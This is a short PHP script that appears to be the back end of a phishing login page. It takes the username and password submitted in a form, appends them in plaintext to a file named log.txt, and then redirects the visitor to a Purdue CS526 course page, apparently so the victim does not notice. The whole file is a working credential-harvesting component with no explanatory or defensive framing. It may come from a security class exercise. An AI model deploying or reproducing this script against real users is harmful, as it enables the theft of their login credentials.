<?php


$username = $_POST['username'];
$password = $_POST['password'];

$log = fopen("log.txt", "a+");
fputs($log, "Username: $username | Password: $password \n");
fclose($log);

header("Location: http://forest.cs.purdue.edu/cs526/");
